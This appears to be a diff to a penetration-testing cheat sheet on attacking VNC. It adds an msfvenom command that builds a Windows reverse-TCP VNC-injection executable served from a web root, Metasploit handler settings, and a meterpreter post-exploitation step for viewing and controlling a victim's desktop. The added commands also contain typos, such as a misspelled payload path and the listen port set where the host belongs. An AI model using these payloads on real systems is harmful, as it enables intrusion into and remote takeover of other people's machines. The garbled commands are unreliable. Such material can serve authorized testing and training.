@@ -30,8 +30,26 @@ msf > set pass_file /your/dictionary/file
 msf > run
 ```
 
+### MSFVenom vnc payload
+```
+msfvenom -p windows/vncinject/reverse_tcp lhost=[your_ip] lport=[your_port] -f exe > /var/www/html/vnc.exe
+
+msf > use exploit/multi/handler
+msf > set payload/widnows/vncinject/reverse_tcp
+msf > set lport [your_ip]
+msf > set lport [your_port]
+msf > set viewonly false
+msf > run
+```
+
+### VNC Post Exploitation
+```
+meterpreter > run vnc
+```
+
 ### VNC access
 ```
+sudo apt install tigervnc-viewer
 vncviewer [victim_ip]:[victim_port]
 ```
 
